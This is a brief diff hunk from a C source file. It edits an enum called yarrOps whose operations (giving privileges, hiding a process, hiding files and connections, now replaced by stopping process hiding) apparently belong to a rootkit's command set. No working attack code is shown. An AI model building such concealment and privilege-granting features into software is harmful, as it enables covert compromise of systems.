@@ -40,8 +40,7 @@
 typedef enum {
 	GIVE_PRIVILEGES,
 	HIDE_PROCESS,
-	HIDE_FILE,
-	HIDE_CONNECTION
+	STOP_HIDE_PROCESS
 } yarrOps;
 
 // TODO: This will need more fields when we implement more functionality.
